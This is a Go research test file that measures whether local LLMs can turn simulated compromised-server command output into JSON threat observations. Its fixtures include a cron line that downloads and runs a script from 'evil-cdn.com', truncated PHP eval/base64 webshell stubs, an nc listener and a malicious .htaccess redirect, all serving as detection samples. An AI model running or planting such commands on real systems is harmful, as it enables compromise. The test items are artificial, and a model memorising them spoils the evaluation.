//go:build research

// Package redaction contains RES-04: Local LLM capability floor.
// Tests whether small/medium models can classify raw command output
// into structured observation types and produce valid JSON.
//
// Run: go test -tags research -v -timeout 10m -run TestLocalLLMCapability ./internal/research/redaction/
//
// Env:
//
//	RESEARCH_API_URL  — LLM endpoint (default: http://localhost:11434/v1/chat/completions)
//	RESEARCH_MODEL    — model name (default: qwen2.5-coder:32b)
//	RESEARCH_API_KEY  — API key (optional)
package redaction

import (
	"encoding/json"
	"fmt"
	"testing"
	"time"
)

// observationCase is a raw command output that the LLM must classify.
type observationCase struct {
	name           string
	rawOutput      string
	wantTypes      []string // expected observation types in response
	wantMinObs     int      // minimum observations expected
	wantJSONFields []string // fields that must exist in each observation
}

const classifySystem = `You are a system investigation agent. You receive raw command output from a Linux server and must classify findings into structured observations.

Return ONLY valid JSON matching this schema, no markdown fences, no commentary:
{"observations":[{"type":"<observation_type>","detail":"<one line description>","severity":"low|medium|high|critical"}]}

Valid observation types:
- file_hash_mismatch: file content differs from expected
- redirect_detected: HTTP redirect to suspicious domain
- unauthorized_user: unknown user account found
- suspicious_code: obfuscated or malicious code patterns
- config_modified: configuration file unexpectedly changed
- unknown_file: file exists that shouldn't be there
- permission_anomaly: incorrect file permissions
- cron_anomaly: unexpected scheduled task
- process_anomaly: suspicious running process
- network_anomaly: unexpected network connection`

var capabilityCases = []observationCase{
	{
		name: "wordpress_file_scan",
		rawOutput: `$ find /var/www/site/wp-content -name "*.php" -newer /var/www/site/wp-includes/version.php
/var/www/site/wp-content/plugins/akismet/x.php
/var/www/site/wp-content/mu-plugins/loader.php
/var/www/site/wp-content/themes/flavor/header.php

$ grep -r "eval(base64_decode" /var/www/site/wp-content/
/var/www/site/wp-content/plugins/akismet/x.php:<?php eval(base64_decode("aWYoaXNzZXQoJF9..."));
/var/www/site/wp-content/mu-plugins/loader.php:<?php $a=str_rot13(gzinflate(base64_decode("...")));eval($a);

$ md5sum /var/www/site/wp-content/themes/flavor/header.php
a1b2c3d4e5f6  /var/www/site/wp-content/themes/flavor/header.php
Expected: f6e5d4c3b2a1`,
		wantTypes:      []string{"suspicious_code", "unknown_file"},
		wantMinObs:     2,
		wantJSONFields: []string{"type", "detail", "severity"},
	},
	{
		name: "cron_and_process_check",
		rawOutput: `$ crontab -l -u www-data
*/5 * * * * wget -q http://evil-cdn.com/update.sh -O /tmp/.update && bash /tmp/.update
0 2 * * * /usr/bin/logrotate /etc/logrotate.d/apache2

$ ps aux | grep -v grep | grep -E "(wget|curl|nc|socat)"
www-data  8842  0.0  0.1  12345  4567 ?  S  14:00  0:00 wget -q http://evil-cdn.com/beacon
root      1234  0.0  0.0   5678  1234 ?  S  12:00  0:00 /usr/sbin/cron

$ ss -tlnp | grep -v 127.0.0.1
LISTEN  0  128  0.0.0.0:22   *  users:(("sshd",pid=999))
LISTEN  0  128  0.0.0.0:80   *  users:(("apache2",pid=1111))
LISTEN  0  128  0.0.0.0:4444 *  users:(("nc",pid=8843))`,
		wantTypes:      []string{"cron_anomaly", "process_anomaly"},
		wantMinObs:     2,
		wantJSONFields: []string{"type", "detail", "severity"},
	},
	{
		name: "user_and_permission_audit",
		rawOutput: `$ cat /etc/passwd | grep -E ":(0|sudo):" | grep -v "^root:"
wpadmin2:x:0:0::/root:/bin/bash

$ find /var/www -perm -o+w -type f 2>/dev/null
/var/www/site/wp-config.php
/var/www/site/.htaccess
/var/www/site/wp-content/uploads/2026/shell.php

$ stat /var/www/site/wp-config.php
  File: /var/www/site/wp-config.php
  Size: 3456     Blocks: 8    IO Block: 4096  regular file
Access: (0666/-rw-rw-rw-)  Uid: (33/www-data)  Gid: (33/www-data)
Modify: 2026-02-17 03:14:00.000000000 +0000

$ last -n 5
wpadmin2 pts/0  10.99.88.77  Wed Feb 17 03:12 - 03:18  (00:06)
root     pts/1  192.168.1.1  Tue Feb 16 10:00 - 10:30  (00:30)`,
		wantTypes:      []string{"unauthorized_user", "permission_anomaly"},
		wantMinObs:     3,
		wantJSONFields: []string{"type", "detail", "severity"},
	},
	{
		name: "http_redirect_check",
		rawOutput: `$ curl -sL -D - http://example-site.com -o /dev/null
HTTP/1.1 301 Moved Permanently
Location: http://example-site.com/
HTTP/1.1 200 OK
Content-Type: text/html

$ curl -sL -D - http://example-site.com -o /dev/null -A "Mozilla/5.0 (Linux; Android"
HTTP/1.1 301 Moved Permanently
Location: http://example-site.com/
HTTP/1.1 302 Found
Location: https://casino-winner-bonus.com/promo?ref=hacked
HTTP/1.1 200 OK

$ grep -r "casino\|redirect\|base64" /var/www/site/.htaccess
RewriteCond %{HTTP_USER_AGENT} (android|iphone|mobile) [NC]
RewriteRule ^(.*)$ https://casino-winner-bonus.com/promo?ref=hacked [R=302,L]`,
		wantTypes:      []string{"redirect_detected", "config_modified"},
		wantMinObs:     2,
		wantJSONFields: []string{"type", "detail", "severity"},
	},
}

type observation struct {
	Type     string `json:"type"`
	Detail   string `json:"detail"`
	Severity string `json:"severity"`
}

type observationResponse struct {
	Observations []observation `json:"observations"`
}

type capabilityResult struct {
	name         string
	rawResponse  string
	jsonValid    bool
	parseError   string
	obsCount     int
	typeHits     int
	typeTotal    int
	typesMissing []string
	fieldsOK     bool
	severityOK   bool
	latencyMS    int64
}

func TestLocalLLMCapability(t *testing.T) {
	apiURL := envOr("RESEARCH_API_URL", defaultAPIURL)
	model := envOr("RESEARCH_MODEL", defaultModel)
	apiKey := envOr("RESEARCH_API_KEY", "")

	t.Logf("Endpoint: %s", apiURL)
	t.Logf("Model:    %s", model)

	if _, err := callLLM(apiURL, apiKey, model, "You are a test.", "Say OK.", 50); err != nil {
		t.Fatalf("LLM not reachable: %v", err)
	}

	var results []capabilityResult

	for _, tc := range capabilityCases {
		t.Run(tc.name, func(t *testing.T) {
			prompt := fmt.Sprintf("Analyze this raw command output and classify all findings:\n\n%s", tc.rawOutput)

			start := time.Now()
			raw, err := callLLM(apiURL, apiKey, model, classifySystem, prompt, 600)
			latency := time.Since(start).Milliseconds()

			r := capabilityResult{
				name:      tc.name,
				latencyMS: latency,
			}

			if err != nil {
				r.parseError = err.Error()
				t.Logf("LLM error: %v", err)
				results = append(results, r)
				return
			}

			r.rawResponse = raw
			t.Logf("Response (%dms):\n%s", latency, raw)

			cleaned := cleanJSON(raw)
			var resp observationResponse
			if err := json.Unmarshal([]byte(cleaned), &resp); err != nil {
				// Try parsing as raw array (some models return [{...}] instead of {"observations":[...]}).
				var obs []observation
				if err2 := json.Unmarshal([]byte(cleaned), &obs); err2 != nil {
					r.jsonValid = false
					r.parseError = err.Error()
					t.Logf("JSON parse failed: %v", err)
					results = append(results, r)
					return
				}
				resp.Observations = obs
			}

			r.jsonValid = true
			r.obsCount = len(resp.Observations)

			// Check required types present.
			r.typeTotal = len(tc.wantTypes)
			foundTypes := map[string]bool{}
			for _, obs := range resp.Observations {
				foundTypes[obs.Type] = true
			}
			for _, wt := range tc.wantTypes {
				if foundTypes[wt] {
					r.typeHits++
				} else {
					r.typesMissing = append(r.typesMissing, wt)
				}
			}

			// Check all observations have required fields.
			r.fieldsOK = true
			r.severityOK = true
			validSeverities := map[string]bool{"low": true, "medium": true, "high": true, "critical": true}
			for _, obs := range resp.Observations {
				if obs.Type == "" || obs.Detail == "" {
					r.fieldsOK = false
				}
				if !validSeverities[obs.Severity] {
					r.severityOK = false
				}
			}

			t.Logf("Observations: %d (min expected: %d)", r.obsCount, tc.wantMinObs)
			t.Logf("Types: %d/%d correct", r.typeHits, r.typeTotal)
			if len(r.typesMissing) > 0 {
				t.Logf("Missing types: %v", r.typesMissing)
			}
			t.Logf("All types found: %v", mapKeys(foundTypes))
			t.Logf("Fields OK: %v, Severity OK: %v", r.fieldsOK, r.severityOK)

			results = append(results, r)
		})
	}

	// Summary.
	t.Log("\n=== CAPABILITY SUMMARY ===")
	t.Logf("Model: %s", model)
	totalTypes := 0
	totalTypeHits := 0
	totalJSON := 0
	totalFieldsOK := 0
	totalSeverityOK := 0
	for _, r := range results {
		if r.jsonValid {
			totalJSON++
		}
		if r.fieldsOK {
			totalFieldsOK++
		}
		if r.severityOK {
			totalSeverityOK++
		}
		totalTypes += r.typeTotal
		totalTypeHits += r.typeHits

		status := "PASS"
		if !r.jsonValid {
			status = "FAIL(json)"
		} else if r.typeHits < r.typeTotal {
			status = fmt.Sprintf("PARTIAL(%d/%d)", r.typeHits, r.typeTotal)
		}
		if !r.fieldsOK {
			status += "+FIELDS"
		}
		t.Logf("  %-35s %s  obs=%d  %dms", r.name, status, r.obsCount, r.latencyMS)
	}
	t.Logf("JSON valid:        %d/%d", totalJSON, len(results))
	t.Logf("Type accuracy:     %d/%d (%.0f%%)", totalTypeHits, totalTypes, pct(totalTypeHits, totalTypes))
	t.Logf("Fields complete:   %d/%d", totalFieldsOK, len(results))
	t.Logf("Severity valid:    %d/%d", totalSeverityOK, len(results))

	if totalJSON < len(results) {
		t.Logf("VERDICT: FAIL — JSON generation unreliable")
	} else if pct(totalTypeHits, totalTypes) < 70 {
		t.Logf("VERDICT: FAIL — classification accuracy too low for observation mode")
	} else {
		t.Logf("VERDICT: PASS — model suitable for observation/classification")
	}
}

func pct(a, b int) float64 {
	if b == 0 {
		return 0
	}
	return float64(a) / float64(b) * 100
}

func mapKeys(m map[string]bool) []string {
	var keys []string
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}
